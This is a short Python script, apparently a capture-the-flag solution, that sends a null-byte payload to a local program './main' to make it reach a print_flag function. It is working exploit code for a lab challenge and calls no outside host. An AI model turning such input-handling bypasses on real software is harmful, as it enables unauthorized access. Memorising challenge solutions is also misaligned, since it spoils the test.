import os
import sys
import subprocess

def exploit():
    # Payload: The string with the null byte \0 in the middle
    payload = b"\0def"

    # Run the vulnerable program and pass the payload
    process = subprocess.Popen(["./main"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate(input=payload)

    # Print output to see if we successfully triggered the print_flag function
    print(stdout.decode())
    print(stderr.decode())

if __name__ == "__main__":
    exploit()

